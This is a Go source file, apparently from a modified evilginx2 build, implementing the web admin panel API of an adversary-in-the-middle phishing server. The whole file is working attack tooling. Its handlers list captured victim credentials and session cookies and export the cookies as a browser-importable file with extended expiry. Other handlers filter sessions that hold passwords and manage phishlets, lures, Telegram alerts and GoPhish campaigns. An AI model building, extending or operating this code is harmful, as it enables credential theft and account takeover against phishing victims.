package core

import (
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	gp_models "github.com/kgretzky/evilginx2/gophish/models"
	"github.com/kgretzky/evilginx2/log"
)

type WebAPI struct {
	db        *database.Database
	cfg       *Config
	ns        *Nameserver
	hp        *HttpProxy
	adminPass string
}

func NewWebAPI(db *database.Database, cfg *Config, ns *Nameserver, hp *HttpProxy) *WebAPI {
	return &WebAPI{
		db:  db,
		cfg: cfg,
		ns:  ns,
		hp:  hp,
	}
}

func (w *WebAPI) Start(port int) {
	w.initAuth()

	mux := http.NewServeMux()

	// Public routes (no auth required)
	mux.HandleFunc("/api/auth/login", w.handleLogin)
	mux.HandleFunc("/api/auth/check", w.handleAuthCheck)
	mux.HandleFunc("/login", w.handleLoginPage)

	// Static files (no auth required)
	mux.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("web/css"))))
	mux.Handle("/js/", http.StripPrefix("/js/", http.FileServer(http.Dir("web/js"))))
	mux.Handle("/img/", http.StripPrefix("/img/", http.FileServer(http.Dir("web/img"))))

	// Auth management (auth required)
	mux.HandleFunc("/api/auth/logout", w.requireAuth(w.handleLogoutAPI))
	mux.HandleFunc("/api/auth/change-password", w.requireAuth(w.handleChangePassword))

	// User management (admin only)
	mux.HandleFunc("/api/users", w.requireAdmin(func(rw http.ResponseWriter, req *http.Request) {
		switch req.Method {
		case http.MethodGet:
			w.handleListUsers(rw, req)
		case http.MethodPost:
			w.handleCreateUser(rw, req)
		case http.MethodDelete:
			w.handleDeleteUser(rw, req)
		default:
			http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		}
	}))

	// Session endpoints — reads: any auth; writes: operator+
	mux.HandleFunc("/api/sessions", w.requireAuth(w.handleSessions))
	mux.HandleFunc("/api/sessions/download", w.requireAuth(w.handleSessionDownload))
	mux.HandleFunc("/api/sessions/delete-bulk", w.requireOperator(w.handleDeleteBulk))
	mux.HandleFunc("/api/sessions/mark-reviewed", w.requireOperator(w.handleMarkReviewed))
	mux.HandleFunc("/api/sessions/export", w.requireAuth(w.handleSessionsExport))
	mux.HandleFunc("/api/sessions/", w.requireAuth(w.handleSessionDetail))

	// Stats endpoints (read-only)
	mux.HandleFunc("/api/stats", w.requireAuth(w.handleStats))
	mux.HandleFunc("/api/stats/timeline", w.requireAuth(w.handleStatsTimeline))
	mux.HandleFunc("/api/stats/by-phishlet", w.requireAuth(w.handleStatsByPhishlet))

	// Config endpoints — reads: any auth; update: operator+
	mux.HandleFunc("/api/config", w.requireAuth(w.handleConfig))
	mux.HandleFunc("/api/config/full", w.requireAuth(w.handleConfigFull))
	mux.HandleFunc("/api/config/update", w.requireOperator(w.handleUpdateConfig))

	// Phishlet endpoints — reads: any auth; mutations: operator+
	mux.HandleFunc("/api/phishlets", w.requireAuth(w.handlePhishlets))
	mux.HandleFunc("/api/phishlets/enable", w.requireOperator(w.handlePhishletEnable))
	mux.HandleFunc("/api/phishlets/disable", w.requireOperator(w.handlePhishletDisable))
	mux.HandleFunc("/api/phishlets/hide", w.requireOperator(w.handlePhishletHide))
	mux.HandleFunc("/api/phishlets/hostname", w.requireOperator(w.handlePhishletHostname))

	// Lure endpoints — reads: any auth; mutations: operator+
	mux.HandleFunc("/api/lures", w.requireAuth(w.handleLures))
	mux.HandleFunc("/api/lures/create", w.requireOperator(w.handleLureCreate))
	mux.HandleFunc("/api/lures/delete", w.requireOperator(w.handleLureDelete))

	// GoPhish endpoints (read-only)
	mux.HandleFunc("/api/gophish/campaigns", w.requireAuth(w.handleGophishCampaigns))
	mux.HandleFunc("/api/gophish/campaigns/results", w.requireAuth(w.handleGophishCampaignResults))

	// Audit log (read-only)
	mux.HandleFunc("/api/audit", w.requireAuth(w.handleAudit))

	// Telegram settings — read: any auth; save: operator+
	mux.HandleFunc("/get-telegram", w.requireAuth(w.handleGetTelegram))
	mux.HandleFunc("/settings/save", w.requireOperator(w.handleSaveTelegram))

	// Legacy endpoints (operator+)
	mux.HandleFunc("/delete-all", w.requireOperator(w.handleDeleteAllSessions))
	mux.HandleFunc("/logout", w.requireAuth(w.handleLogout))

	// Index (root)
	mux.HandleFunc("/", w.handleIndex)

	log.Info("Starting Web Admin API at http://0.0.0.0:%d", port)
	go http.ListenAndServe(fmt.Sprintf(":%d", port), securityHeaders(mux))
}

// securityHeaders adds defensive HTTP headers to every response.
func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		rw.Header().Set("X-Frame-Options", "DENY")
		rw.Header().Set("X-Content-Type-Options", "nosniff")
		rw.Header().Set("X-XSS-Protection", "1; mode=block")
		rw.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
		next.ServeHTTP(rw, req)
	})
}

// ---------- Index & Login Page ----------

func (w *WebAPI) handleIndex(rw http.ResponseWriter, req *http.Request) {
	if req.URL.Path != "/" {
		http.NotFound(rw, req)
		return
	}
	// Redirect to login if not authenticated
	_, err := w.getUserFromRequest(req)
	if err != nil {
		http.Redirect(rw, req, "/login", http.StatusFound)
		return
	}
	http.ServeFile(rw, req, "web/index.html")
}

func (w *WebAPI) handleLoginPage(rw http.ResponseWriter, req *http.Request) {
	http.ServeFile(rw, req, "web/login.html")
}

// ---------- Sessions ----------

func (w *WebAPI) handleSessions(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(sessions)
}

func (w *WebAPI) handleSessionDetail(rw http.ResponseWriter, req *http.Request) {
	// Parse ID from /api/sessions/{id}
	idStr := strings.TrimPrefix(req.URL.Path, "/api/sessions/")
	if idStr == "" {
		http.Error(rw, "missing session id", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(rw, "invalid session id", http.StatusBadRequest)
		return
	}

	session, err := w.db.GetSessionById(id)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusNotFound)
		json.NewEncoder(rw).Encode(map[string]string{"error": "session not found"})
		return
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(session)
}

func (w *WebAPI) handleSessionDownload(rw http.ResponseWriter, req *http.Request) {
	idStr := req.URL.Query().Get("id")
	id, _ := strconv.Atoi(idStr)
	session, err := w.db.GetSessionById(id)
	if err != nil {
		http.Error(rw, "Session not found", http.StatusNotFound)
		return
	}

	defaultExpiry := time.Now().Add(30 * 24 * time.Hour).Unix()
	cookieArray := []map[string]interface{}{}
	for domain, domainCookies := range session.CookieTokens {
		for name, cookie := range domainCookies {
			cookieName := name
			if cookie.Name != "" {
				cookieName = cookie.Name
			}
			cookieArray = append(cookieArray, map[string]interface{}{
				"name":           cookieName,
				"value":          cookie.Value,
				"domain":         domain,
				"path":           cookie.Path,
				"httpOnly":       cookie.HttpOnly,
				"secure":         cookie.Secure,
				"expirationDate": defaultExpiry,
			})
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=cookies_%d.json", id))
	json.NewEncoder(rw).Encode(cookieArray)
}

func (w *WebAPI) handleDeleteBulk(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Ids []int `json:"ids"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid request body"})
		return
	}

	deleted := 0
	for _, id := range payload.Ids {
		if err := w.db.DeleteSessionById(id); err == nil {
			deleted++
		}
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "delete_sessions_bulk", fmt.Sprintf("Deleted %d sessions", deleted), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]interface{}{
		"message": fmt.Sprintf("deleted %d sessions", deleted),
		"deleted": deleted,
	})
}

func (w *WebAPI) handleMarkReviewed(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Ids []int `json:"ids"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid request body"})
		return
	}

	marked := 0
	for _, id := range payload.Ids {
		if err := w.db.MarkSessionReviewed(id); err == nil {
			marked++
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]interface{}{
		"message": fmt.Sprintf("marked %d sessions as reviewed", marked),
		"marked":  marked,
	})
}

func (w *WebAPI) handleSessionsExport(rw http.ResponseWriter, req *http.Request) {
	sessions, err := w.db.ListSessions()
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(rw).Encode(map[string]string{"error": "failed to list sessions"})
		return
	}

	// Apply filters from query params
	phishletFilter := req.URL.Query().Get("phishlet")
	hasCredsFilter := req.URL.Query().Get("has_creds")
	sinceStr := req.URL.Query().Get("since")

	var filtered []*database.Session
	for _, s := range sessions {
		if phishletFilter != "" && s.Phishlet != phishletFilter {
			continue
		}
		if hasCredsFilter == "true" && s.Username == "" && s.Password == "" {
			continue
		}
		if sinceStr != "" {
			sinceTs, err := strconv.ParseInt(sinceStr, 10, 64)
			if err == nil && s.CreateTime < sinceTs {
				continue
			}
		}
		filtered = append(filtered, s)
	}

	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Content-Disposition", "attachment; filename=sessions_export.json")
	json.NewEncoder(rw).Encode(filtered)
}

// ---------- Stats ----------

func (w *WebAPI) handleStats(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()
	total := len(sessions)
	validCount := 0
	for _, s := range sessions {
		if len(s.CookieTokens) > 0 {
			validCount++
		}
	}
	invalidCount := total - validCount

	validPct, invalidPct := 0.0, 0.0
	if total > 0 {
		validPct = math.Round(float64(validCount) / float64(total) * 100)
		invalidPct = math.Round(float64(invalidCount) / float64(total) * 100)
	}

	validTrend := "bear"
	if validPct >= 50 {
		validTrend = "bull"
	}
	invalidTrend := "bear"
	if invalidPct > 50 {
		invalidTrend = "bull"
	}

	stats := map[string]interface{}{
		"total":          total,
		"validCount":     validCount,
		"invalidCount":   invalidCount,
		"visitPercent":   100,
		"visitTrend":     "bull",
		"validPercent":   validPct,
		"validTrend":     validTrend,
		"invalidPercent": invalidPct,
		"invalidTrend":   invalidTrend,
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(stats)
}

func (w *WebAPI) handleStatsTimeline(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()

	// Group sessions by day
	dayMap := make(map[string]int)
	for _, s := range sessions {
		day := time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02")
		dayMap[day]++
	}

	type dayEntry struct {
		Date  string `json:"date"`
		Count int    `json:"count"`
	}
	timeline := make([]dayEntry, 0, len(dayMap))
	for day, count := range dayMap {
		timeline = append(timeline, dayEntry{Date: day, Count: count})
	}
	sort.Slice(timeline, func(i, j int) bool {
		return timeline[i].Date < timeline[j].Date
	})

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(timeline)
}

func (w *WebAPI) handleStatsByPhishlet(rw http.ResponseWriter, req *http.Request) {
	sessions, _ := w.db.ListSessions()

	phishletMap := make(map[string]int)
	for _, s := range sessions {
		phishletMap[s.Phishlet]++
	}

	type phishletEntry struct {
		Phishlet string `json:"phishlet"`
		Count    int    `json:"count"`
	}
	result := make([]phishletEntry, 0, len(phishletMap))
	for name, count := range phishletMap {
		result = append(result, phishletEntry{Phishlet: name, Count: count})
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Count > result[j].Count
	})

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(result)
}

// ---------- Config ----------

func (w *WebAPI) handleConfig(rw http.ResponseWriter, req *http.Request) {
	configData := map[string]interface{}{
		"general": map[string]interface{}{
			"domain": w.cfg.GetServerBindIP(),
		},
	}
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(configData)
}

func (w *WebAPI) handleConfigFull(rw http.ResponseWriter, req *http.Request) {
	enabledSites := w.cfg.GetEnabledSites()

	phishlets := []map[string]interface{}{}
	for _, name := range w.cfg.GetPhishletNames() {
		hostname, _ := w.cfg.GetSiteDomain(name)
		phishlets = append(phishlets, map[string]interface{}{
			"name":     name,
			"enabled":  w.cfg.IsSiteEnabled(name),
			"hidden":   w.cfg.IsSiteHidden(name),
			"hostname": hostname,
		})
	}

	lures := []interface{}{}
	for i := 0; i < w.cfg.GetLureCount(); i++ {
		l, err := w.cfg.GetLure(i)
		if err == nil {
			lures = append(lures, map[string]interface{}{
				"index":           i,
				"id":              l.Id,
				"phishlet":        l.Phishlet,
				"hostname":        l.Hostname,
				"path":            l.Path,
				"redirect":        l.RedirectUrl,
				"redirector":      l.Redirector,
				"post_redirector": l.PostRedirector,
				"info":            l.Info,
			})
		}
	}

	configData := map[string]interface{}{
		"general": map[string]interface{}{
			"external_ip":    w.cfg.GetServerExternalIP(),
			"bind_ip":        w.cfg.GetServerBindIP(),
			"base_domain":    w.cfg.GetBaseDomain(),
			"https_port":     w.cfg.GetHttpsPort(),
			"http_port":      w.cfg.GetHttpPort(),
			"dns_port":       w.cfg.GetDnsPort(),
			"unauth_url":     w.cfg.GetUnauthUrl(),
			"blacklist_mode": w.cfg.GetBlacklistMode(),
		},
		"telegram": map[string]interface{}{
			"bot_token": w.cfg.GetTelegramBotToken(),
			"chat_id":   w.cfg.GetTelegramChatID(),
			"enabled":   w.cfg.GetTelegramEnabled(),
		},
		"gophish": map[string]interface{}{
			"admin_url": w.cfg.GetGoPhishAdminUrl(),
			"api_key":   w.cfg.GetGoPhishApiKey(),
		},
		"enabled_sites": enabledSites,
		"phishlets":     phishlets,
		"lures":         lures,
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(configData)
}

func (w *WebAPI) handleUpdateConfig(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		General struct {
			Domain           string `json:"domain"`
			UnauthUrl        string `json:"unauth_url"`
			TelegramBotToken string `json:"telegram_bot_token"`
			TelegramChatId   string `json:"telegram_chat_id"`
		} `json:"general"`
	}

	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	if payload.General.Domain != "" {
		w.cfg.SetServerBindIP(payload.General.Domain)
	}
	if payload.General.UnauthUrl != "" {
		w.cfg.SetUnauthUrl(payload.General.UnauthUrl)
	}
	if payload.General.TelegramBotToken != "" {
		w.cfg.SetTelegramBotToken(payload.General.TelegramBotToken)
	}
	if payload.General.TelegramChatId != "" {
		w.cfg.SetTelegramChatID(payload.General.TelegramChatId)
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "update_config", "Configuration updated via API", clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Configuration updated successfully"})
}

// ---------- Phishlets ----------

func (w *WebAPI) handlePhishlets(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	phishlets := []map[string]interface{}{}
	for _, name := range w.cfg.GetPhishletNames() {
		hostname, _ := w.cfg.GetSiteDomain(name)
		phishlets = append(phishlets, map[string]interface{}{
			"name":     name,
			"enabled":  w.cfg.IsSiteEnabled(name),
			"hidden":   w.cfg.IsSiteHidden(name),
			"hostname": hostname,
		})
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(phishlets)
}

func (w *WebAPI) handlePhishletEnable(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	phishlet, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		http.Error(rw, "Phishlet not found", http.StatusNotFound)
		return
	}

	err = w.cfg.SetSiteEnabled(payload.Name)
	if err != nil {
		http.Error(rw, "Failed to enable phishlet", http.StatusInternalServerError)
		return
	}

	log.Important("WebAPI: Enabled phishlet '%s'", phishlet.Name)

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "enable_phishlet", fmt.Sprintf("Enabled phishlet '%s'", payload.Name), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet enabled"})
}

func (w *WebAPI) handlePhishletDisable(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	_, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		http.Error(rw, "Phishlet not found", http.StatusNotFound)
		return
	}

	err = w.cfg.SetSiteDisabled(payload.Name)
	if err != nil {
		http.Error(rw, "Failed to disable phishlet", http.StatusInternalServerError)
		return
	}

	log.Important("WebAPI: Disabled phishlet '%s'", payload.Name)

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "disable_phishlet", fmt.Sprintf("Disabled phishlet '%s'", payload.Name), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet disabled"})
}

func (w *WebAPI) handlePhishletHide(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Name string `json:"name"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	_, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		http.Error(rw, "Phishlet not found", http.StatusNotFound)
		return
	}

	err = w.cfg.SetSiteHidden(payload.Name, true)
	if err != nil {
		http.Error(rw, "Failed to hide phishlet", http.StatusInternalServerError)
		return
	}

	log.Important("WebAPI: Hidden phishlet '%s'", payload.Name)

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "hide_phishlet", fmt.Sprintf("Hidden phishlet '%s'", payload.Name), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Phishlet hidden"})
}

func (w *WebAPI) handlePhishletHostname(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Name     string `json:"name"`
		Hostname string `json:"hostname"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	_, err := w.cfg.GetPhishlet(payload.Name)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusNotFound)
		json.NewEncoder(rw).Encode(map[string]string{"error": "phishlet not found"})
		return
	}

	if !w.cfg.SetSiteHostname(payload.Name, payload.Hostname) {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "failed to set hostname"})
		return
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "set_phishlet_hostname", fmt.Sprintf("Set hostname for '%s' to '%s'", payload.Name, payload.Hostname), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Hostname updated"})
}

// ---------- Lures ----------

func (w *WebAPI) handleLures(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	lures := []map[string]interface{}{}
	for i := 0; i < w.cfg.GetLureCount(); i++ {
		l, err := w.cfg.GetLure(i)
		if err == nil {
			lures = append(lures, map[string]interface{}{
				"index":            i,
				"id":               l.Id,
				"phishlet":         l.Phishlet,
				"hostname":         l.Hostname,
				"path":             l.Path,
				"redirect_url":     l.RedirectUrl,
				"redirector":       l.Redirector,
				"post_redirector":  l.PostRedirector,
				"ua_filter":        l.UserAgentFilter,
				"info":             l.Info,
				"og_title":         l.OgTitle,
				"og_desc":          l.OgDescription,
				"og_image":         l.OgImageUrl,
				"og_url":           l.OgUrl,
				"paused_until":     l.PausedUntil,
			})
		}
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(lures)
}

func (w *WebAPI) handleLureCreate(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Phishlet       string `json:"phishlet"`
		Path           string `json:"path"`
		RedirectUrl    string `json:"redirect_url"`
		Redirector     string `json:"redirector"`
		PostRedirector string `json:"post_redirector"`
		Info           string `json:"info"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid request body"})
		return
	}

	if payload.Phishlet == "" {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "phishlet name is required"})
		return
	}

	_, err := w.cfg.GetPhishlet(payload.Phishlet)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusNotFound)
		json.NewEncoder(rw).Encode(map[string]string{"error": "phishlet not found"})
		return
	}

	l := &Lure{
		Phishlet:       payload.Phishlet,
		Path:           payload.Path,
		RedirectUrl:    payload.RedirectUrl,
		Redirector:     payload.Redirector,
		PostRedirector: payload.PostRedirector,
		Info:           payload.Info,
	}
	w.cfg.AddLure(payload.Phishlet, l)

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "create_lure", fmt.Sprintf("Created lure for phishlet '%s'", payload.Phishlet), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	rw.WriteHeader(http.StatusCreated)
	json.NewEncoder(rw).Encode(map[string]string{"message": "Lure created"})
}

func (w *WebAPI) handleLureDelete(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Index int `json:"index"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid request body"})
		return
	}

	err := w.cfg.DeleteLure(payload.Index)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": err.Error()})
		return
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "delete_lure", fmt.Sprintf("Deleted lure at index %d", payload.Index), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Lure deleted"})
}

// ---------- GoPhish ----------

func (w *WebAPI) handleGophishCampaigns(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	summaries, err := gp_models.GetCampaignSummaries(1)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(rw).Encode(map[string]string{"error": fmt.Sprintf("failed to get campaigns: %v", err)})
		return
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(summaries)
}

func (w *WebAPI) handleGophishCampaignResults(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	idStr := req.URL.Query().Get("id")
	if idStr == "" {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "id query parameter is required"})
		return
	}
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(rw).Encode(map[string]string{"error": "invalid id"})
		return
	}

	results, err := gp_models.GetCampaignResults(id, 1)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(rw).Encode(map[string]string{"error": fmt.Sprintf("failed to get campaign results: %v", err)})
		return
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(results)
}

// ---------- Audit ----------

func (w *WebAPI) handleAudit(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodGet {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	limitStr := req.URL.Query().Get("limit")
	limit := 100
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}

	entries, err := w.db.ListAuditEntries(limit)
	if err != nil {
		rw.Header().Set("Content-Type", "application/json")
		rw.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(rw).Encode(map[string]string{"error": "failed to list audit entries"})
		return
	}

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(entries)
}

// ---------- Telegram Settings ----------

func (w *WebAPI) handleGetTelegram(rw http.ResponseWriter, req *http.Request) {
	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{
		"chatId":   w.cfg.GetTelegramChatID(),
		"botToken": w.cfg.GetTelegramBotToken(),
	})
}

func (w *WebAPI) handleSaveTelegram(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		ChatId   string `json:"chatId"`
		BotToken string `json:"botToken"`
	}
	if err := json.NewDecoder(req.Body).Decode(&payload); err != nil {
		http.Error(rw, "Invalid JSON payload", http.StatusBadRequest)
		return
	}

	w.cfg.SetTelegramChatID(payload.ChatId)
	w.cfg.SetTelegramBotToken(payload.BotToken)
	w.cfg.SetTelegramEnabled(true)

	if w.hp != nil {
		w.hp.ReloadTelegramConfig()
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "save_telegram", "Telegram settings saved", clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "Telegram Settings Saved & Bot Reloaded"})
}

// ---------- Legacy Endpoints ----------

func (w *WebAPI) handleDeleteAllSessions(rw http.ResponseWriter, req *http.Request) {
	if req.Method != http.MethodPost {
		http.Error(rw, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	sessions, _ := w.db.ListSessions()
	for _, s := range sessions {
		w.db.DeleteSessionById(s.Id)
	}

	user, _ := w.getUserFromRequest(req)
	username := "unknown"
	if user != nil {
		username = user.Username
	}
	clientIP := getClientIP(req)
	w.db.CreateAuditEntry(username, "delete_all_sessions", fmt.Sprintf("Deleted all %d sessions", len(sessions)), clientIP)

	rw.Header().Set("Content-Type", "application/json")
	json.NewEncoder(rw).Encode(map[string]string{"message": "All sessions deleted successfully"})
}

func (w *WebAPI) handleLogout(rw http.ResponseWriter, req *http.Request) {
	cookie, err := req.Cookie(authCookieName)
	if err == nil {
		username, _ := w.getAuthSession(cookie.Value)
		w.deleteAuthSession(cookie.Value)
		if username != "" {
			clientIP := getClientIP(req)
			w.db.CreateAuditEntry(username, "logout", "User logged out", clientIP)
		}
	}

	http.SetCookie(rw, &http.Cookie{
		Name:     authCookieName,
		Value:    "",
		Path:     "/",
		HttpOnly: true,
		MaxAge:   -1,
	})

	http.Redirect(rw, req, "/login", http.StatusFound)
}
